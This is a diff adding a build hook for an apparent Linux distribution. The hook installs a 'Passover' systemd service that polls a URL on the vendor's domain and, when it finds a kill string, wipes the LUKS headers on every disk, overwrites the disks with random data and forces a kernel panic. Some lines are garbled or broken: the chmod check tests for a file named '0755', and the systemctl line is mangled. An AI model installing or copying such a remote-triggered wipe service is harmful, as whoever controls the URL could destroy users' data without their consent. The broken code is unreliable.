@@ -1,0 +1,59 @@
+#!/usr/bin/env -S prlimit --as=1073741824 unshare /bin/bash
+export GIT_TERMINAL_PROMPT=0
+export DEBIAN_FRONTEND=noninteractive
+# SPDX-License-Identifier: AGPL-3.0-or-later
+# 0998-alfred-passover.hook.chroot
+# The Passover: Decentralized Remote Wipe Beacon
+set +e
+
+echo "[0998] Configuring The Passover (Remote Wipe Beacon)"
+
+# We will install a lightweight script that monitors an off-grid Pastebin or
+# a specific encrypted Solana memo. For this implementation, it will ping a generic 
+# URL (which the user controls) and check for the cryptographic "Passover" kill-string.
+
+cat << 'EOF' > /usr/local/bin/alfred-passover-beacon
+#!/bin/bash
+# Checks the remote beacon every 5 minutes
+# In production, change this URL to a decentralized IPFS hash or Tor hidden service
+BEACON_URL="https://alfredlinux.com/beacon/status.txt"
+KILL_STRING="EXECUTE_PASSOVER_PROTOCOL_777"
+
+while true; do
+    RESPONSE=$(curl -s -m 10 "$BEACON_URL" || true)
+    
+    if echo "$RESPONSE" | grep -q "$KILL_STRING"; then
+        echo "PASSOVER PROTOCOL TRIGGERED. ERASING SYSTEM."
+        # Shred the LUKS headers (if encrypted)
+        for dev in $(lsblk -nd -o NAME | grep -E '^sd|^nvme'); do
+            cryptsetup erase "/dev/$dev" 2>/dev/null || true
+            dd if=/dev/urandom of="/dev/$dev" bs=1M count=100 2>/dev/null || true
+        done
+        # Trigger kernel panic
+        echo c > /proc/sysrq-trigger || true
+    fi
+    sleep 300
+done
+EOF
+
+[ -e "0755" ] && chmod 0755 /usr/local/bin/alfred-passover-beacon || true
+
+cat << 'EOF' > /etc/systemd/system/alfred-passover.service
+[Unit]
+Description=Alfred Linux Passover (Remote Wipe Beacon)
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/usr/local/bin/alfred-passover-beacon
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+systemctl enable alfred-passover || true || true.service || true
+
+echo "[0998] The Passover Angel is watching."
+
+exit 0
